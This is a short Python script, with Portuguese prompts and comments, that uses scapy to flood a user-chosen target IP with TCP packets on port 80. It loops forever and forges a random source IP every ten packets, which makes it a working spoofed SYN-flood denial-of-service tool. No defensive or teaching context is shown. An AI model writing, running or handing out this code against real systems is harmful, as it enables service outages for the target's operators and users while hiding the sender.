from scapy.all import IP, TCP, send
import random

target = input('Digite o IP de destino, o alvo: ')
i = 1

while True:
    src = ".".join(str(random.randint(1, 254)) for _ in range(4)) # ip aleatório
    srcport = random.randint(1024, 65535) # gera uma porta aleatória
    
    for _ in range(10): # troca de ip a cada 10 pacotes enviados
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcport, dport=80)
        pkt = IP1 / TCP1
        send(pkt, inter=.001)
        print(f'Enviando pacote número: {i} de {src}')
        i += 1